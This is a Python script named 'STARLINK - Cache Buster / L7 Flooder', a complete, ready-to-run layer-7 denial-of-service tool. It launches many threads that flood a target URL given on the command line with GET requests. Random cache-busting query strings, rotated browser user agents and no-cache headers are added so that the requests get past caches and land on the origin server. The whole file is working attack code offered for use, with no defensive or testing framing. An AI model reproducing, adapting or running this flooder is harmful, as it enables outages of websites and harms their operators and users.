#!/usr/bin/env python3
"""
STARLINK - Cache Buster / L7 Flooder
"""

import socket
import ssl
import time
import random
import string
import threading
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

# Colors
ORANGE = '\033[38;5;214m'
CYAN = Fore.CYAN
GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
RESET = Style.RESET_ALL

class StarLink:
    def __init__(self, target, threads=50, duration=300):
        self.target = target.replace('https://', '').replace('http://', '').split('/')[0]
        self.path = '/' + '/'.join(target.replace('https://', '').replace('http://', '').split('/')[1:]) if '/' in target else '/'
        self.threads = threads
        self.duration = duration
        self.running = True
        self.request_count = 0
        self.start_time = datetime.now()
        
        # User agents
        self.agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
        
        # Cache busting patterns
        self.patterns = [
            lambda: f"?cache={random.randint(100000,999999)}",
            lambda: f"?_={int(time.time()*1000)}",
            lambda: f"?cb={self.rand_str(12)}",
            lambda: f"?v={random.randint(1,999)}",
            lambda: f"?t={datetime.now().strftime('%Y%m%d%H%M%S')}",
            lambda: f"?nocache={self.rand_str(10)}",
            lambda: f"?ver={random.randint(1000,9999)}",
            lambda: f"?ts={int(time.time())}",
            lambda: f"?rand={self.rand_str(16)}",
            lambda: f"?cachebuster={random.randint(1,1000000)}"
        ]
        
        # HTTP versions for variety
        self.http_vers = ["HTTP/1.0", "HTTP/1.1"]
        
        print(f"\n{CYAN}STARLINK Cache Buster{RESET}")
        print(f"Target: {target}")
        print(f"Threads: {threads}")
        print(f"Duration: {duration}s")
        print("=" * 60)
        
    def rand_str(self, n=8):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
    
    def build_request(self):
        """Build request with random cache buster"""
        http_ver = random.choice(self.http_vers)
        cache_buster = random.choice(self.patterns)()
        
        # Randomize path with cache buster
        full_path = f"{self.path}{cache_buster}"
        
        request = f"GET {full_path} {http_ver}\r\n"
        request += f"Host: {self.target}\r\n"
        request += f"User-Agent: {random.choice(self.agents)}\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        request += "Accept-Language: en-US,en;q=0.5\r\n"
        request += "Accept-Encoding: gzip, deflate\r\n"
        request += "Connection: keep-alive\r\n"
        request += f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
        request += f"Pragma: no-cache\r\n"
        request += f"Expires: 0\r\n"
        request += f"Referer: https://www.google.com/search?q={self.rand_str(10)}\r\n"
        request += "\r\n"
        
        return request.encode()
    
    def attack(self, thread_id):
        """Single thread attack function"""
        while self.running:
            try:
                # Create socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                # HTTPS support
                if 'https' in str(self.target) or ':443' in str(self.target):
                    context = ssl.create_default_context()
                    sock = context.wrap_socket(sock, server_hostname=self.target.split(':')[0])
                    port = 443
                else:
                    port = 80
                
                # Connect
                host = self.target.split(':')[0]
                sock.connect((host, port))
                
                # Send request
                request = self.build_request()
                sock.send(request)
                
                # Receive response (partial)
                try:
                    response = sock.recv(4096)
                    status = int(response.split(b'\r\n')[0].split(b' ')[1]) if response else 0
                except:
                    status = 0
                
                sock.close()
                
                # Count request
                self.request_count += 1
                
                # Print status every 50 requests
                if self.request_count % 50 == 0:
                    elapsed = (datetime.now() - self.start_time).seconds
                    rate = self.request_count / elapsed if elapsed > 0 else 0
                    print(f"{CYAN}[{elapsed}s]{RESET} Requests: {self.request_count} | Rate: {rate:.1f}/s | Thread {thread_id}")
                
            except Exception as e:
                pass
    
    def start(self):
        """Start attack threads"""
        threads = []
        
        # Start threads
        for i in range(self.threads):
            t = threading.Thread(target=self.attack, args=(i+1,))
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.05)  # Stagger thread start
        
        print(f"{GREEN}[+] {self.threads} threads launched{RESET}")
        print(f"{YELLOW}[*] Running for {self.duration} seconds...{RESET}")
        
        # Run for duration
        time.sleep(self.duration)
        self.running = False
        
        # Summary
        elapsed = (datetime.now() - self.start_time).seconds
        print(f"\n{YELLOW}═══ Attack Complete ═══{RESET}")
        print(f"Total Requests: {self.request_count}")
        print(f"Average Rate: {self.request_count/elapsed:.1f} req/s")
        print(f"Duration: {elapsed}s")

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python starlink.py <target> [threads] [duration]")
        print("Example: python starlink.py https://example.com 100 60")
        sys.exit(1)
    
    target = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 50
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 300
    
    star = StarLink(target, threads, duration)
    star.start()
